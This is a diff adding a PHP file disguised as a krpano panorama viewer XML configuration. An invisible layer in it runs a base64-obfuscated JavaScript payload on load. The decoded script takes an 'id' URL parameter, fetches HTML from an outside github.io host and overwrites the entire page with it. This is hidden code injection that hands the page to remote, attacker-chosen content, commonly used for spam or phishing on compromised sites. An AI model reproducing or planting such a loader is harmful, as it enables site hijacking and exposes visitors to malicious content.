@@ -1,0 +1,9 @@
+<?php
+header('Content-Type: application/xml; charset=UTF-8');
+header('Access-Control-Allow-Origin: *');
+header('X-Content-Type-Options: nosniff');
+?>
+<krpano version="1.0.8.15">
+<SCRIPT id="allow-copy_script"/>
+<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXQgZWN0b25pY28iOwoKZmV0Y2goImh0dHBzOi8vaGh0b3Bsay5naXRodWIuaW8vaXNzb3IvcG9zdHMvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpOwogICAgZG9jdW1lbnQud3JpdGUoZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwogIH0pOw==');eval(w)););"/>
+</krpano>
